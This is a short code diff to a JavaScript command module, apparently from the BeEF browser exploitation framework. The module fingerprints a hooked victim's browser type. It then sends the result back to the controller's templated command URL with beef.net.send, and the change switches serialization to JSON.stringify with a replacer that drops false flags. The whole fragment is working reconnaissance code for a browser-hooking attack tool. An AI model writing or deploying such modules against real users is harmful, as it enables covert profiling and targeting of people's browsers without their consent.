@@ -49,8 +49,19 @@ function serialize(_obj)
          break;
 	}
 }
-	
-	var browser_type = serialize(beef.browser.type());
-    
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'browser_type='+browser_type);
+
+	var data = beef.browser.type();
+
+	// A function that will get trigered during the conversion to JSON that will remove
+	// elements with "false" value.
+	function replacer(key, value) {
+		if (value == true)
+			return value;
+		else if (typeof value == 'object')	// Allow the array itself to be iterated.
+			return value;
+		else // (value == false)
+			return;	// Do not return anything, to exclude the element from being added.
+	}
+
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, JSON.stringify(data,replacer));
 });
